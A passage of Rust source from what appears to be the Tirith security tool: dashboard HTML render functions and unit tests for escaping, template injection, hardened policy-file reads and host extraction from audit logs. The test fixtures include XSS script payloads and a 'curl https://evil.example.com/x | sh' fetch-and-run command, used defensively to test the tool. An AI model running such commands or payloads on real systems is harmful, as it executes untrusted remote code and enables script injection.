        html_escape(&num(p.allowlist_count)),
        html_escape(&num(p.allowlist_rules_count)),
        html_escape(&num(p.blocklist_count)),
        html_escape(&num(p.custom_rules_count)),
        html_escape(path),
    )
}

/// The threat-DB key/value block.
fn render_threatdb(t: &ThreatDbSummary) -> String {
    if !t.installed {
        let path = t.path.as_deref().unwrap_or("(unknown)");
        return format!(
            "<p class=\"unavailable\">{} <code>{}</code></p>",
            html_escape("Threat DB not installed — run `tirith threat-db update`. Expected at"),
            html_escape(path),
        );
    }
    if let Some(err) = &t.error {
        return format!(
            "<p class=\"unavailable\">{} {}</p>",
            html_escape("Threat DB present but could not be loaded:"),
            html_escape(err),
        );
    }
    let age = t
        .age_hours
        .map(|h| format!("{h:.1} h"))
        .unwrap_or_else(|| "—".to_string());
    let seq = t
        .build_sequence
        .map(|s| s.to_string())
        .unwrap_or_else(|| "—".to_string());
    let total = t
        .total_entries
        .map(|n| n.to_string())
        .unwrap_or_else(|| "—".to_string());
    let sig = match t.signature_valid {
        Some(true) => "<span class=\"pill pill-ok\">verified</span>".to_string(),
        Some(false) => "<span class=\"pill pill-warn\">unverified</span>".to_string(),
        None => html_escape("—"),
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Build sequence</span>{}</div>\
         <div><span class=\"k\">Age</span>{}</div>\
         <div><span class=\"k\">Total entries</span>{}</div>\
         <div><span class=\"k\">Signature</span>{}</div>\
         </div>",
        html_escape(&seq),
        html_escape(&age),
        html_escape(&total),
        sig,
    )
}

/// The trust + canary key/value block.
fn render_trust(t: &TrustSummary) -> String {
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">User trust entries</span>{}</div>\
         <div><span class=\"k\">Repo trust entries</span>{}</div>\
         <div><span class=\"k\">Canary tokens</span>{}</div>\
         <div><span class=\"k\">Canaries with callback</span>{}</div>\
         </div>",
        html_escape(&t.user_trust_count.to_string()),
        html_escape(&t.repo_trust_count.to_string()),
        html_escape(&t.canary_count.to_string()),
        html_escape(&t.canary_with_callback.to_string()),
    )
}

/// The shell-hook status block.
fn render_hook(h: &HookSummary) -> String {
    let pill = if h.installed {
        "<span class=\"pill pill-ok\">installed</span>"
    } else {
        "<span class=\"pill pill-off\">not installed</span>"
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Detected shell</span>{}</div>\
         <div><span class=\"k\">Hook status</span>{}</div>\
         </div>",
        html_escape(&h.shell),
        pill,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The full set of environment variables that influence where
    /// `build_policy_summary` resolves config from. `config_dir()` (etcetera)
    /// reads `XDG_CONFIG_HOME` on Linux/macOS but `%APPDATA%`/`%LOCALAPPDATA%`
    /// on Windows; trust counts additionally resolve via `HOME`/`USERPROFILE`;
    /// and policy discovery / remote-fetch read `TIRITH_*`. A hermetic test must
    /// pin EVERY one of these (so it never reads the developer's real config on
    /// any OS) and restore EVERY one (so it never leaks into a later test).
    const ENV_KEYS: [&str; 8] = [
        "XDG_CONFIG_HOME",
        "APPDATA",
        "LOCALAPPDATA",
        "HOME",
        "USERPROFILE",
        "TIRITH_POLICY_ROOT",
        "TIRITH_SERVER_URL",
        "TIRITH_API_KEY",
    ];

    /// RAII guard that, on construction, SAVES the prior value of every key in
    /// [`ENV_KEYS`] and applies the test's overrides, then on `Drop` RESTORES
    /// every saved value (set-back or remove). Mirrors the `EnvVarGuard` shape
    /// in `policy.rs`/`mcp/tools.rs`, but operates on the whole config-resolving
    /// env set at once so a test cannot read real config or leak state.
    ///
    /// `TEST_ENV_LOCK` (held by the caller) serializes env-mutating tests; this
    /// guard adds the restore half. Must be bound to a live local
    /// (`let _env = …`) so it is dropped at the end of the test, not eagerly.
    struct DashboardEnvGuard {
        prev: Vec<(&'static str, Option<std::ffi::OsString>)>,
    }

    impl DashboardEnvGuard {
        /// Snapshot all [`ENV_KEYS`], then apply `overrides`: `Some(v)` sets the
        /// var, `None` removes it. Keys in [`ENV_KEYS`] not named in `overrides`
        /// are removed, so the resolved environment is fully determined by the
        /// caller regardless of what the host shell had set. Values are
        /// `&OsStr`, so both `Path::as_os_str()` and string literals (e.g. a
        /// `TIRITH_SERVER_URL`) pass through uniformly.
        fn apply(overrides: &[(&'static str, Option<&std::ffi::OsStr>)]) -> Self {
            let prev = ENV_KEYS.iter().map(|&k| (k, std::env::var_os(k))).collect();
            // SAFETY: env mutation is serialized by `TEST_ENV_LOCK`, which the
            // caller holds for the lifetime of this guard.
            unsafe {
                for &key in ENV_KEYS.iter() {
                    let ovr = overrides.iter().find(|(k, _)| *k == key);
                    match ovr {
                        Some((_, Some(value))) => std::env::set_var(key, value),
                        // Named with None, or not named at all → ensure unset so
                        // the host environment cannot bleed in.
                        _ => std::env::remove_var(key),
                    }
                }
            }
            Self { prev }
        }
    }

    impl Drop for DashboardEnvGuard {
        fn drop(&mut self) {
            // SAFETY: still serialized by `TEST_ENV_LOCK` held by the caller.
            unsafe {
                for (key, prev) in &self.prev {
                    match prev {
                        Some(v) => std::env::set_var(key, v),
                        None => std::env::remove_var(key),
                    }
                }
            }
        }
    }

    fn empty_snapshot() -> DashboardSnapshot {
        DashboardSnapshot {
            schema_version: 1,
            generated_at: "2026-05-31T00:00:00+00:00".into(),
            window_days: 7,
            window_start: "2026-05-24T00:00:00+00:00".into(),
            window_end: "2026-05-31T00:00:00+00:00".into(),
            audit: None,
            policy: PolicySummary {
                paranoia: Some(1),
                fail_mode: Some("open".into()),
                allowlist_count: Some(0),
                allowlist_rules_count: Some(0),
                blocklist_count: Some(0),
                custom_rules_count: Some(0),
                path: None,
                error: None,
            },
            threatdb: ThreatDbSummary {
                installed: false,
                path: None,
                age_hours: None,
                build_sequence: None,
                total_entries: None,
                signature_valid: None,
                error: None,
            },
            trust: TrustSummary {
                user_trust_count: 0,
                repo_trust_count: 0,
                canary_count: 0,
                canary_with_callback: 0,
            },
            hook: HookSummary {
                shell: "zsh".into(),
                installed: false,
            },
        }
    }

    // -----------------------------------------------------------------------
    // Invariant A — HTML escaping. EVERY interpolated value must pass through
    // html_escape; a `<script>` in a redacted command preview must never
    // appear literally in the rendered HTML.
    // -----------------------------------------------------------------------

    #[test]
    fn html_escape_orders_ampersand_first() {
        // `&` first, so a `<` that becomes `&lt;` is not re-escaped to `&amp;lt;`.
        assert_eq!(html_escape("a & b"), "a &amp; b");
        assert_eq!(html_escape("<tag>"), "&lt;tag&gt;");
        assert_eq!(html_escape("\"q\""), "&quot;q&quot;");
        assert_eq!(html_escape("it's"), "it&#x27;s");
        // Combined: a single ampersand is escaped exactly once.
        assert_eq!(
            html_escape("<a href=\"x&y\">'</a>"),
            "&lt;a href=&quot;x&amp;y&quot;&gt;&#x27;&lt;/a&gt;"
        );
    }

    #[test]
    fn escaping_neutralizes_script_tag() {
        // PINNED TEST (invariant A): a snapshot whose redacted preview carries a
        // `<script>` payload must render escaped — never as a live tag.
        let mut snap = empty_snapshot();
        snap.audit = Some(AuditSummary {
            total_commands: 1,
            total_findings: 1,
            block_rate: 1.0,
            sessions_seen: 1,
            actions: vec![("Block".into(), 1)],
            // The hostile payload lands in BOTH a findings row and a hosts row so
            // we cover the count-table render path with attacker bytes.
            top_findings: vec![("<script>alert(1)</script>".into(), 1)],
            top_hosts: vec![("<script>alert('xss')</script>".into(), 1)],
            skipped_lines: 0,
        });

        let html = render_html(&snap);

        assert!(
            html.contains("&lt;script&gt;"),
            "the script tag must be HTML-escaped in the output"
        );
        assert!(
            !html.contains("<script>alert(1)</script>"),
            "a literal <script>alert(1)</script> must NOT appear in the rendered HTML"
        );
        assert!(
            !html.contains("<script>alert('xss')</script>"),
            "a literal <script>alert('xss')</script> must NOT appear in the rendered HTML"
        );
        // The single-quote in the host payload is escaped numerically.
        assert!(
            html.contains("&#x27;xss&#x27;"),
            "single quotes in attacker bytes must be escaped as &#x27;"
        );
    }

    #[test]
    fn snapshot_value_with_literal_marker_is_escaped_not_expanded() {
        // PINNED TEST (CodeRabbit M13 finding R2): a user-controlled snapshot
        // value that contains the literal text of a template marker (here
        // `{{HOOK_SECTION}}`) must be emitted ESCAPED and must NOT be expanded
        // into the hook section. The old recursive `.replace()` loop would
        // re-substitute it; the single-pass expander never re-scans output.
        let mut snap = empty_snapshot();
        // generated_at maps to `{{GENERATED_AT}}`. Smuggle a marker plus a
        // sentinel inside it.
        snap.generated_at = "SENTINEL_PRE {{HOOK_SECTION}} SENTINEL_POST".into();

        let html = render_html(&snap);

        // `html_escape` does not touch braces, so the marker text survives
        // verbatim in the escaped value and must appear literally exactly once.
        assert_eq!(
            html.matches("SENTINEL_PRE {{HOOK_SECTION}} SENTINEL_POST")
                .count(),
            1,
            "the injected marker text must appear once, verbatim and un-expanded"
        );
        // The real hook section (driven by the `{{HOOK_SECTION}}` placeholder in
        // the template) is rendered exactly ONCE from the snapshot's own hook
        // data — the injected copy did NOT spawn a second hook pill. The
        // uninstalled hook pill is a unique, attacker-uncontrollable string.
        assert_eq!(
            html.matches(r#"<span class="pill pill-off">not installed</span>"#)
                .count(),
            1,
            "the injected marker must not have been expanded into a 2nd hook section"
        );
    }

    #[test]
    fn render_html_has_no_unreplaced_placeholders() {
        // Every `{{…}}` marker in the template must be substituted — an
        // unreplaced marker would mean a section silently rendered nothing.
        let html = render_html(&empty_snapshot());
        assert!(
            !html.contains("{{"),
            "no template placeholder may survive rendering: {html}"
        );
        // The template must remain self-contained: no external resource loads.
        let lower = html.to_ascii_lowercase();
        assert!(!lower.contains("http://"), "no external http resource");
        assert!(!lower.contains("https://"), "no external https resource");
        assert!(!lower.contains("<script"), "no <script> element at all");
        assert!(
            !lower.contains("src=") && !lower.contains("href="),
            "no src=/href= external references"
        );
    }

    #[test]
    fn expand_template_edge_cases() {
        // Adjacent markers `{{A}}{{B}}` are each substituted independently in one
        // left-to-right pass.
        assert_eq!(
            expand_template(
                "{{A}}{{B}}",
                &[("{{A}}", "x".into()), ("{{B}}", "y".into())]
            ),
            "xy",
            "adjacent markers each expand once"
        );

        // An unterminated `{{` (no closing `}}`) is emitted verbatim as literal
        // template text — never treated as a marker.
        assert_eq!(
            expand_template("pre {{UNCLOSED", &[("{{UNCLOSED}}", "z".into())]),
            "pre {{UNCLOSED",
            "unterminated marker is literal trailing text"
        );

        // An UNKNOWN marker (not in `subs`) passes through unchanged.
        assert_eq!(
            expand_template("a {{UNKNOWN}} b", &[("{{KNOWN}}", "v".into())]),
            "a {{UNKNOWN}} b",
            "unknown marker is passed through verbatim"
        );

        // Security property (single pass, no re-expansion): a substituted VALUE
        // that itself contains a marker is emitted verbatim and is NEVER re-scanned
        // — the boundary that stops template/XSS injection via snapshot content.
        // `{{A}}`'s value contains `{{B}}`, which must NOT be expanded even though
        // `{{B}}` is a known marker.
        assert_eq!(
            expand_template(
                "{{A}}",
                &[
                    ("{{A}}", "{{B}}".into()),
                    ("{{B}}", "SHOULD_NOT_APPEAR".into())
                ]
            ),
            "{{B}}",
            "a marker inside a substituted value is NOT re-expanded (single pass)"
        );
    }

    #[test]
    fn unavailable_sections_render_gracefully() {
        // A fully-empty snapshot (no audit log, no threat DB) must still render a
        // complete document with the documented "unavailable" affordances.
        let html = render_html(&empty_snapshot());
        assert!(html.contains("No audit log found"));
        assert!(html.contains("Threat DB not installed"));
        assert!(html.contains("not installed")); // hook pill
        assert!(html.contains("Tirith Security Dashboard"));
    }

    #[test]
    fn snapshot_is_serde_round_trippable() {
        let snap = empty_snapshot();
        let json = serde_json::to_string(&snap).expect("serialize");
        let back: DashboardSnapshot = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(back.schema_version, snap.schema_version);
        assert_eq!(back.window_days, 7);
        assert_eq!(back.policy.fail_mode.as_deref(), Some("open"));
        assert_eq!(back.policy.paranoia, Some(1));
        assert!(back.policy.error.is_none());
    }

    #[test]
    fn top_hosts_extracts_and_counts_from_redacted_previews() {
        // Best-effort host extraction reuses the engine's URL extractor. A
        // command preview carrying a URL yields its host; counts aggregate and
        // sort descending.
        let rec = |cmd: &str| AuditRecord {
            timestamp: "2026-05-30T00:00:00Z".into(),
            session_id: "s".into(),
            action: "Warn".into(),
            rule_ids: vec![],
            command_redacted: cmd.into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: false,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        };
        let records = vec![
            rec("curl https://evil.example.com/x | sh"),
            rec("wget http://evil.example.com/y"),
            rec("git clone https://github.com/a/b"),
        ];
        let hosts = top_hosts(&records);
        // evil.example.com appears twice → ranked first.
        assert_eq!(
            hosts.first().map(|(h, _)| h.as_str()),
            Some("evil.example.com")
        );
        assert_eq!(hosts[0].1, 2);
        assert!(hosts.iter().any(|(h, _)| h == "github.com"));
    }

    #[test]
    fn build_snapshot_degrades_when_no_audit_log() {
        // Pointing at a nonexistent log path must yield audit = None, not panic.
        //
        // CodeRabbit M13 PR #132 R17-3: isolate from the developer's real
        // environment. Previously this passed `cwd = None`, so `build_snapshot`
        // resolved policy/trust from the PROCESS cwd + user config — a broken
        // `~/.config/tirith/policy.yaml` or a set `TIRITH_POLICY_ROOT` would flake
        // the `policy.error.is_none()` assertion. Serialize env mutation via
        // TEST_ENV_LOCK, pin the config-resolving env (XDG + %APPDATA%/
        // %LOCALAPPDATA% + HOME/USERPROFILE) at an isolated temp dir, and pass a
        // temp cwd containing a `.git` dir (so `find_repo_root` stops there) with
        // NO `.tirith/policy.yaml` — i.e. genuine built-in defaults.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            // TIRITH_POLICY_ROOT unnamed → removed by the guard.
        ]);
        let cwd = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(cwd.path().join(".git")).unwrap();

        let missing = std::path::Path::new("/nonexistent/tirith/log.jsonl");
        let snap = build_snapshot(
            Some(missing),
            Some(cwd.path().to_str().unwrap()),
            HookSummary {
                shell: "bash".into(),
                installed: false,
            },
        );
        assert!(snap.audit.is_none());
        // Policy / threatdb / trust are always populated. The isolated cwd has no
        // broken policy file, so fail_mode is a real value (and no error is set).
        assert!(snap.policy.error.is_none());
        assert!(matches!(
            snap.policy.fail_mode.as_deref(),
            Some("open") | Some("closed")
        ));
    }

    #[test]
    fn generate_serve_token_is_64_hex_chars_and_varies() {
        let t1 = generate_serve_token().expect("rng");
        let t2 = generate_serve_token().expect("rng");
        assert_eq!(t1.len(), SERVE_TOKEN_BYTES * 2, "64 hex chars for 32 bytes");
        assert!(
            t1.bytes().all(|b| b.is_ascii_hexdigit()),
            "token must be lower-hex"
        );
        assert_ne!(t1, t2, "two freshly-generated tokens must differ");
    }

    #[test]
    fn build_policy_summary_surfaces_broken_policy_and_keeps_genuine_defaults() {
        // CodeRabbit M13 PR #132 R5-1: a security dashboard must NOT present a
        // malformed `.tirith/policy.yaml` as benign built-in defaults (a
        // fail-open lie). `build_policy_summary` uses a STRICT load:
        //   * broken file   → error populated, numeric fields None, path set
        //   * NO policy file → genuine defaults, error None, path None
        //   * valid file     → parsed values, error None, path set
        // Env mutation is serialized via the crate-wide TEST_ENV_LOCK and
        // isolated so the developer's real user-config policy is never read on
        // ANY OS. The guard pins the full config-resolving env set (XDG +
        // %APPDATA%/%LOCALAPPDATA% + HOME/USERPROFILE) at the isolated dir and
        // clears TIRITH_*, then restores every value on drop.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            // TIRITH_POLICY_ROOT / TIRITH_SERVER_URL / TIRITH_API_KEY unnamed →
            // removed by the guard.
        ]);

        // (1) Present-but-unparseable policy file → error surfaced, no defaults.
        let broken = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(broken.path().join(".git")).unwrap();
        std::fs::create_dir_all(broken.path().join(".tirith")).unwrap();
        // Unterminated flow sequence — a hard YAML syntax error.
        std::fs::write(
            broken.path().join(".tirith/policy.yaml"),
            "paranoia: [unterminated\n",
        )
        .unwrap();
        let summary = build_policy_summary(Some(broken.path().to_str().unwrap()));
        assert!(
            summary.error.is_some(),
            "a malformed policy file must surface an error, not silent defaults: {summary:?}"
        );
        assert!(
            summary.paranoia.is_none()
                && summary.fail_mode.is_none()
                && summary.allowlist_count.is_none()
                && summary.custom_rules_count.is_none(),
            "numeric fields must be None for a policy that failed to load: {summary:?}"
        );
        assert!(
            summary.path.is_some(),
            "the path of the file that failed to parse must still be reported"
        );

        // (2) NO policy file anywhere → genuine built-in defaults, no error.
        let none_dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(none_dir.path().join(".git")).unwrap();
        let summary = build_policy_summary(Some(none_dir.path().to_str().unwrap()));
        assert!(
            summary.error.is_none(),
            "absence of a policy file is NOT an error: {summary:?}"
        );
        assert_eq!(
            summary.paranoia,
            Some(1),
            "no policy file → built-in default paranoia tier 1"
        );
        assert_eq!(
            summary.fail_mode.as_deref(),
            Some("open"),
            "no policy file → built-in default fail mode open"
        );
        assert_eq!(summary.custom_rules_count, Some(0));
        assert!(
            summary.path.is_none(),
            "no policy file → no path (genuine defaults)"
        );

        // (3) Valid policy file → parsed values, no error.
        let valid = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(valid.path().join(".git")).unwrap();
        std::fs::create_dir_all(valid.path().join(".tirith")).unwrap();
        std::fs::write(
            valid.path().join(".tirith/policy.yaml"),
            "paranoia: 3\nfail_mode: closed\n",
        )
        .unwrap();
        let summary = build_policy_summary(Some(valid.path().to_str().unwrap()));
        assert!(summary.error.is_none(), "a valid policy has no error");
        assert_eq!(summary.paranoia, Some(3));
        assert_eq!(summary.fail_mode.as_deref(), Some("closed"));
        assert!(summary.path.is_some());

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn build_policy_summary_non_regular_policy_yields_safe_error() {
        // CodeRabbit M13 PR #132 R23: the discovered policy path is repo-CONTROLLED.
        // A NON-REGULAR file at `.tirith/policy.yaml` (here a DIRECTORY; `mkdir
        // policy.yaml` is the simplest cross-platform non-regular) must surface the
        // fail-closed `error` state via `read_regular_capped`'s `NotRegularFile`
        // rejection — NOT panic, and NOT read as benign defaults. (`find_policy_in_dir`
        // discovers any path that `.exists()`, directory included, so this exercises
        // the hardened read.) Env is isolated exactly as the sibling broken-policy
        // test so the developer's real user-config policy is never consulted.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        // The policy "file" is a directory — a non-regular path.
        std::fs::create_dir_all(repo.path().join(".tirith/policy.yaml")).unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            summary.error.is_some(),
            "a non-regular policy path must surface the fail-closed error state, \
             not benign defaults: {summary:?}"
        );
        assert!(
            summary.paranoia.is_none()
                && summary.fail_mode.is_none()
                && summary.allowlist_count.is_none(),
            "numeric fields must be None when the policy did not load: {summary:?}"
        );
        let err = summary.error.as_deref().unwrap();
        // On Unix, opening a directory succeeds and the fstat-based regular-file
        // check produces the "not a regular file" message. On Windows, `File::open`
        // on a directory fails at open time with an OS error — also fail-closed,
        // just a different message. The cross-platform fail-closed contract (error
        // state, no benign defaults, path reported) is asserted above; only the
        // exact non-regular message is Unix-specific.
        #[cfg(unix)]
        assert!(
            err.contains("not a regular file"),
            "the error should explain the non-regular rejection; got {err:?}"
        );
        #[cfg(not(unix))]
        assert!(
            !err.is_empty(),
            "the non-regular path must surface a non-empty fail-closed error; got {err:?}"
        );
        assert!(
            summary.path.is_some(),
            "the path that failed to load must still be reported"
        );
        // `_env` restores the full env set on drop.
    }

    #[test]
    fn build_policy_summary_oversized_policy_yields_safe_error() {
        // CodeRabbit M13 PR #132 R23: an OVERSIZED policy file (> POLICY_READ_CAP)
        // must be refused by `read_regular_capped` BEFORE it is buffered, surfacing
        // the fail-closed `error` state rather than reading the whole file into
        // memory. We write one byte past the cap.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        // One byte over the cap. The content is otherwise harmless YAML padding,
        // proving rejection is on SIZE, not parse failure.
        let oversized = vec![b' '; (POLICY_READ_CAP as usize) + 1];
        std::fs::write(repo.path().join(".tirith/policy.yaml"), &oversized).unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            summary.error.is_some(),
            "an oversized policy file must be rejected (fail-closed error), \
             not buffered and parsed: {summary:?}"
        );
        let err = summary.error.as_deref().unwrap();
        assert!(
            err.contains("exceeds read cap"),
            "the error should explain the size rejection; got {err:?}"
        );
        assert!(summary.path.is_some());
        // `_env` restores the full env set on drop.
    }

    /// CodeRabbit M13 PR #132 R23: a FIFO at the discovered policy path would BLOCK
    /// a plain `std::fs::read_to_string` forever waiting for a writer. The hardened
    /// `read_regular_capped` opens with `O_NONBLOCK` and rejects the non-regular
    /// target, so `build_policy_summary` returns PROMPTLY with the fail-closed error
    /// state. If the guard regressed to a blocking read this test would HANG (caught
    /// by the suite timeout). Unix-only (needs `mkfifo`).
    #[cfg(unix)]
    #[test]
    fn build_policy_summary_fifo_policy_does_not_hang() {
        use std::ffi::CString;
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        let fifo = repo.path().join(".tirith/policy.yaml");
        let c_path = CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
        let rc = unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) };
        if rc != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }

        // Must complete promptly; a blocking read on the writer-less FIFO would
        // hang here. The non-regular FIFO surfaces the fail-closed error state.
        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            summary.error.is_some(),
            "a FIFO at the policy path must surface the error state (and not hang): {summary:?}"
        );
        assert!(summary.paranoia.is_none());
        // `_env` restores the full env set on drop.
    }

    #[test]
    fn count_trust_entries_non_regular_path_counts_zero() {
        // CodeRabbit M13 PR #132 R23: `trust.json` is a repo-controlled path read by
        // the dashboard. A NON-REGULAR path (here a directory) must collapse to the
        // SAME zero-count safe path a missing/unparseable file takes — via
        // `read_regular_capped`'s `NotRegularFile` rejection, never a panic or hang.
        let dir = tempfile::tempdir().unwrap();
        let trust = dir.path().join("trust.json");
        std::fs::create_dir_all(&trust).unwrap();
        assert_eq!(
            count_trust_entries(&trust),
            0,
            "a non-regular trust.json must count as zero (safe), not panic"
        );
    }

    #[test]
    fn count_trust_entries_oversized_path_counts_zero() {
        // CodeRabbit M13 PR #132 R23: an OVERSIZED trust.json (> TRUST_READ_CAP) is
        // refused before buffering and counts as zero — the dashboard never reads an
        // unbounded file into memory just to count entries.
        let dir = tempfile::tempdir().unwrap();
        let trust = dir.path().join("trust.json");
        let oversized = vec![b' '; (TRUST_READ_CAP as usize) + 1];
        std::fs::write(&trust, &oversized).unwrap();
        assert_eq!(
            count_trust_entries(&trust),
            0,
            "an oversized trust.json must count as zero (refused before buffering)"
        );
    }

    #[test]
    fn build_policy_summary_counts_include_effective_overlays() {
        // CodeRabbit M13 PR #132 R6-1: the dashboard must summarize the EFFECTIVE
        // policy `engine::analyze_inner` enforces — i.e. the local parse PLUS the
        // read-only overlay helpers (`load_user_lists` + `load_org_lists` +
        // `load_trust_entries`) that APPEND user/org flat-file lists and
        // non-expired `trust.json` entries to the allow/block lists. Summarizing
        // only the strict local parse (round 5) UNDER-reports those counts.
        //
        // Here a local policy declares ONE allowlist entry; overlays add a user
        // allowlist line, an org blocklist line, and two trust entries (one
        // flat → allowlist, one rule-scoped → allowlist_rules). The effective
        // counts must reflect ALL of them, not just the single local entry. A
        // broken LOCAL file is still the hard-error state (asserted at the end).
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        // `config_dir()` (etcetera) resolves to `<XDG_CONFIG_HOME>/tirith` on
        // Linux/macOS but to `%APPDATA%\tirith` on Windows. The guard points
        // ALL of them at the isolated dir so the developer's real user config is
        // never read AND our user-overlay files are seen on every platform, and
        // clears TIRITH_* — then restores every value on drop.
        let cfg = isolated_config.path().as_os_str();
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
        ]);

        // A valid local policy with exactly one (flat) allowlist entry.
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: 2\nallowlist:\n  - https://local.example.com\n",
        )
        .unwrap();

        // User-scope overlay: a flat allowlist line (`load_user_lists`). Plant
        // it at the SAME path `config_dir()` resolves to under the isolated env
        // (etcetera's base differs by OS — XDG dir vs %APPDATA%), so the file is
        // exactly where `load_user_lists`/`load_trust_entries` will look.
        let user_tirith =
            crate::policy::config_dir().expect("config_dir resolves under the isolated env");
        std::fs::create_dir_all(&user_tirith).unwrap();
        std::fs::write(user_tirith.join("allowlist"), "https://user.example.com\n").unwrap();
        // User-scope trust store: one flat entry (→ allowlist) + one rule-scoped
        // entry (→ allowlist_rules), both permanent (`load_trust_entries`).
        let trust = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "https://trust-flat.example.com", "added": "x", "source": "s"},
                {"pattern": "https://trust-rule.example.com", "added": "x", "source": "s",
                 "rule_id": "plain_http"}
            ]
        });
        std::fs::write(
            user_tirith.join("trust.json"),
            serde_json::to_string(&trust).unwrap(),
        )
        .unwrap();

        // Org-scope overlay: a repo `.tirith/blocklist` line (`load_org_lists`).
        std::fs::write(
            repo.path().join(".tirith/blocklist"),
            "https://blocked.example.com\n",
        )
        .unwrap();

        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));

        // No error — the local file parsed.
        assert!(
            summary.error.is_none(),
            "a valid local policy + overlays is not an error: {summary:?}"
        );
        assert_eq!(summary.paranoia, Some(2), "local paranoia is preserved");

        // allowlist = 1 local + 1 user flat-file + 1 flat trust entry = 3.
        // (Round 5's strict-local-only parse would have reported just 1.)
        assert_eq!(
            summary.allowlist_count,
            Some(3),
            "allowlist must include the user flat-file + flat trust overlays: {summary:?}"
        );
        // allowlist_rules = 1 rule-scoped trust entry.
        assert_eq!(
            summary.allowlist_rules_count,
            Some(1),
            "rule-scoped trust entries must count toward allowlist_rules: {summary:?}"
        );
        // blocklist = 1 org flat-file line.
        assert_eq!(
            summary.blocklist_count,
            Some(1),
            "blocklist must include the org flat-file overlay: {summary:?}"
        );

        // A BROKEN local file is still the hard-error state even though overlays
        // exist — counts are meaningless when the operator's file did not load.
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: [unterminated\n",
        )
        .unwrap();
        let broken = build_policy_summary(Some(repo.path().to_str().unwrap()));
        assert!(
            broken.error.is_some(),
            "a broken LOCAL file must still surface the error state: {broken:?}"
        );
        assert!(
            broken.allowlist_count.is_none(),
            "numeric fields must be None when the local file failed to load: {broken:?}"
        );

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn build_policy_summary_never_fetches_remote_with_server_env_set() {
